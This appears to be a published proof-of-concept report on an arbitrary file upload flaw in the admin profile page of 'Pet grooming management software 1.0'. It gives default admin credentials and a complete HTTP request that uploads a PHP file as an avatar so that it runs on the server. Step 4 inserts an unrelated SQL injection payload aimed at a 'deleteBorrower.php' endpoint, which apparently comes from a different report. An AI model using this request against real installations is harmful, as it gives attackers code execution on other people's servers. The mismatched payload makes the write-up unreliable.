

# Pet grooming management software  - Arbitrary File Upload

#### Exploit Title: Pet grooming management software - Arbitrary File Upload

#### Exploit Author: [webraybtl@webray.com.cn](mailto:webraybtl@webray.com.cn) inc

#### Vendor Homepage: [https://www.sourcecodester.com](https://www.sourcecodester.com/)

#### Software Link:https://www.sourcecodester.com/php/18340/pet-grooming-management-software-download.html

#### Version: Pet grooming management software 1.0

#### Tested on: Windows 10, Apache ,Mysql

#### Description

Pet mining management software has an arbitrary file upload vulnerability. In the upload avatar function, due to insufficient filtering of file suffixes, attackers can exploit this vulnerability to gain server privileges by uploading malicious files.

#### Payload used:

```POST /login.php HTTP/1.1
POST /admin/profile.php HTTP/1.1
Host: 192.168.67.28:8021
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
Referer: http://192.168.67.28:8021/admin/profile.php
Cookie: PHPSESSID=nn7i1gq9g3c5789ch9hgs6nogg
Cache-Control: max-age=0
Origin: http://192.168.67.28:8021
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVGAiR4ALFtG8cq4R
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Length: 1376

------WebKitFormBoundaryVGAiR4ALFtG8cq4R
Content-Disposition: form-data; name="old_website_image"

2.jpg
------WebKitFormBoundaryVGAiR4ALFtG8cq4R
Content-Disposition: form-data; name="website_image"; filename="111.php"
Content-Type: text/plain

<?php phpinfo(); ?>
------WebKitFormBoundaryVGAiR4ALFtG8cq4R
Content-Disposition: form-data; name="fname"

Mayuri
------WebKitFormBoundaryVGAiR4ALFtG8cq4R
Content-Disposition: form-data; name="lname"

K
------WebKitFormBoundaryVGAiR4ALFtG8cq4R
Content-Disposition: form-data; name="dob"

K
------WebKitFormBoundaryVGAiR4ALFtG8cq4R
Content-Disposition: form-data; name="email"

mdkhairnar92@gmail.com
------WebKitFormBoundaryVGAiR4ALFtG8cq4R
Content-Disposition: form-data; name="gender"

Male
------WebKitFormBoundaryVGAiR4ALFtG8cq4R
Content-Disposition: form-data; name="contact"

+919529230459
------WebKitFormBoundaryVGAiR4ALFtG8cq4R
Content-Disposition: form-data; name="username"

mayurik
------WebKitFormBoundaryVGAiR4ALFtG8cq4R
Content-Disposition: form-data; name="address"

Pawfect Grooming Studio,Shop No. 9, Bella Vista Arcade, Banjara Hills,Hyderabad, Telangana – 500034                                                                                                                                                                  
------WebKitFormBoundaryVGAiR4ALFtG8cq4R
Content-Disposition: form-data; name="update"


------WebKitFormBoundaryVGAiR4ALFtG8cq4R--
```

#### Proof of Concept

1、Log in to the system using the default password mdkhairnar92@gmail.com: admin

2、Upload the file and capture the package at the avatar upload location

![image](https://github.com/joinia/webray.com.cn/blob/main/Pet-grooming-management-software/images/uploadpage.png)

3、Modify the website_image to the PHP malicious file we are about to upload

![image](https://github.com/joinia/webray.com.cn/blob/main/Pet-grooming-management-software/images/uploadpayload.png)

4、After sending the request packet, the file can be accessed on the page, and the PHP file has been parsed, displaying information related to PHPINfo.

payload:`http://xxxx/deleteBorrower.php?borrower_id=1'%20AND%20GTID_SUBSET(CONCAT("data:",database()),8194)--%20GZSp`

![image](https://github.com/joinia/webray.com.cn/blob/main/Pet-grooming-management-software/images/uploadfile.png)

5、Pet-grooming-management-software

![image](https://github.com/joinia/webray.com.cn/blob/main/Pet-grooming-management-software/images/code.png)
